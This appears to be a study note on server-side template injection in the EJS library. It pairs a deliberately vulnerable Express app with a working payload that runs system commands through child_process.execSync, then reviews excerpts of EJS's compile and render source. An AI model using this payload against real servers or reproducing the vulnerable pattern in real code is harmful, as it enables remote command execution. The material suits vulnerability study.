## Vulnerable Code
```js
const https = require('https')
const express = require('express')
const ejs = require('ejs')
const { log } = require('console')

const app = express()
const port = 3000

app.set("view engine", "ejs")

app.get("/", (req, res) => {
    var template = `<h1>${req.query.payload}</h1>`
    return res.send(ejs.render(template))
})

app.listen(port, () => log(`Listen On http://localhots:${port}`))
```
## Exploit
```js
http://localhost:3000/?payload=
<%
let output = process.mainModule.require("child_process")
              .execSync("ipconfig")
              .toString();
%>
<h1><b><%= output %></b></h1>
```

## EJS Library Review
### compile function (node_modules/ejs/lib/ejs.js)
#### 1. Prepared template to compile
```js
    if (!this.source) {
      this.generateSource();
      prepended +=
        '  var __output = "";\n' +
        '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
        
    ...
    
    if (opts.compileDebug) {
      src = 'var __line = 1' + '\n'
        + '  , __lines = ' + JSON.stringify(this.templateText) + '\n'
        + '  , __filename = ' + sanitizedFilename + ';' + '\n'
        + 'try {' + '\n'
        + this.source
        + '} catch (e) {' + '\n'
        + '  rethrow(e, __lines, __filename, __line, escapeFn);' + '\n'
        + '}' + '\n';
    }
    ...
    // How to assign opts.async a value?
        try {
      if (opts.async) {
```
#### 2. Render Function
```js
//Source Code (node_module/ejs/lib/ejs.js : 415)
exports.render = function (template, d, o) {
  var data = d || utils.createNullProtoObjWherePossible();
  var opts = o || utils.createNullProtoObjWherePossible();

  // No options object -- if there are optiony names
  // in the data, copy them to options
  if (arguments.length == 2) {
    utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);
  }

  return handleCache(opts, template)(data);
};

// Safe create object - It makes code safe from Prototype Pollution 
exports.createNullProtoObjWherePossible = (function () {
  if (typeof Object.create == 'function') {
    return function () {
      return Object.create(null);
    };
```